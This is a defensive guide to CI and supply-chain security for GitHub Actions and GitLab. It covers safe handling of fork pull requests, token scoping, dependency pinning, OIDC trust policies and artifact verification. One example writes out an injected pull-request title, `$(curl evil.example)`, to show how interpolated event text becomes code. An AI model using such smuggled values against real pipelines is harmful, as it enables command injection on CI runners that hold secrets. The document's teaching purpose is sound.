# CI and supply chain

## Preserve the pipeline's contract

When changing CI, inspect the events, branch rules, conditions, job dependencies, runner versions, permissions, caches, and artifacts, and determine whether each job tests a commit, a merge result, or a release tag, because a selective filter can silently skip required validation and a skipped job may report success or stay pending depending on the provider. Check that the intended jobs run on each affected event.

<example>
Adding a `paths` filter for `src/**` to the `pull_request` trigger in `.github/workflows/ci.yml` also skips the required lint job on a docs-only change, and branch protection then waits for a status that never arrives.
</example>

When a project needs its first pipeline, use the chosen provider and the real project commands, starting with locked installation, existing quality checks, tests where present, and the production build, and leave out deploy jobs, broad matrices, and new services until a need appears, because a minimal pipeline is easier to maintain but must still exercise the deliverable. Check the installation and commands in the runner's environment.

<example>
A Python API's first workflow runs `uv sync --locked`, `uv run pytest` because a `tests/` directory exists, and `uv build`, with no deploy step.
</example>

## Separate untrusted work from authority

When building contributor changes, keep deployment credentials and write-capable tokens unavailable, and inspect the runner model and cross-job inputs before trusting a privileged job, because job separation helps only when workspaces, runners, caches, and artifacts respect the same boundary, and a shared runner can retain attacker-controlled state.

<example>
A fork's pull request builds on a hosted runner with no secrets, while the App Store Connect API key exists only in a `release` environment job that runs on `main`.
</example>

For GitHub Actions, use an ordinary contribution event when it suffices, and avoid checking out or executing untrusted code under `pull_request_target` or a privileged `workflow_run`, because those events run with secrets and write tokens against attacker-controlled input. Treat artifacts from untrusted runs as data, keep token permissions read-only until a specific job needs more, and check fork behavior and credential availability without exposing values.

<example>
A workflow that comments on pull requests sets `contents: read` at the top level and grants `pull-requests: write` to the one commenting job, which never runs `npm ci` on fork code under `pull_request_target`.
</example>

When event text or pipeline parameters reach shell commands, pass them through the provider's data fields and quoted arguments and keep titles, branch names, and user parameters out of script source, because interpolated text becomes code. Check that an input containing quotes and shell metacharacters stays one harmless value.

<example>
A step sets `TITLE` in its `env` from `${{ github.event.pull_request.title }}` and uses `"$TITLE"` in the script, whereas putting the expression inside the script would run a title such as `$(curl evil.example)`.
</example>

## Control executable dependencies

When adding actions, reusable workflows, included configurations, images, or downloaded tools, verify the publisher identity and the exact content, and use supported dependency locking or verified immutable references, because pins improve reviewability but need an update path. Take a hash from the upstream release and check the revision that actually resolves, because an invented hash or a verified-publisher badge proves nothing about safety.

<example>
`uses: actions/checkout@<full-commit-sha>` carries the SHA copied from the release's tag page, and a Dependabot entry for the `github-actions` ecosystem proposes its updates.
</example>

On GitHub, check whether workflow dependency locking is supported for the repository and use verified full commit SHAs where it is not, and on GitLab inspect included configuration references and image digests, because a template's old example versions are not recommendations. Check the installed provider's feature availability before relying on a feature.

<example>
A GitLab `include` that follows `ref: main` of another project is changed to a reviewed tag, and the job `image` gets a digest after `docker buildx imagetools inspect` confirms it.
</example>

## Scope credentials to the operation

When existing infrastructure supports federated authentication, prefer short-lived credentials with constrained trust claims, limiting the repository (by immutable ID where the provider supplies one), workflow, ref or environment, audience, and resource scope as supported, because OIDC removes a stored key but an overly broad trust policy still grants excessive access. Check that allowed and disallowed callers behave as intended in a safe environment.

<example>
A trust policy for the `production` environment matches the `sub` claim that a test run of the repository actually emits and also requires the `repository_id` claim, so a renamed or re-created repository cannot inherit the role, and a branch workflow that requests the same role is refused.
</example>

For existing GitLab variables, distinguish environment scope, protection, masking, and hiding, because they solve different problems and masking cannot stop malicious job code from transmitting a secret. Check which event and branch can read each required variable, inspect transformed error output with harmless values, and keep unrestricted debug tracing off.

<example>
`DEPLOY_TOKEN` is scoped to the `production` environment and protected so only pipelines on the protected `main` branch receive it, while masking only hides it in job logs.
</example>

## Verify outputs and gates

When handing a build artifact to release automation, tie it to its revision, builder, and integrity metadata and verify the expected identity before privileged consumption, because signatures and provenance establish origin and not application correctness. Keep existing signing and SBOM requirements.

<example>
The deploy job downloads `inventory-<sha>.tar.gz` and compares its `sha256sum` with the checksum file written by the build job before unpacking into `/opt/inventory/releases`.
</example>

After a pipeline change, validate the configuration and run the affected commands, and when a remote run is authorized check its revision, required checks, logs, and artifact, because a green status obtained by weakening a test, broadening a credential, or bypassing an approval gate proves nothing. Fix the failing cause instead.

<example>
A failing `bundle exec rspec` step after a Ruby version bump is fixed in the spec or the code, and the job does not get `|| true` appended.
</example>
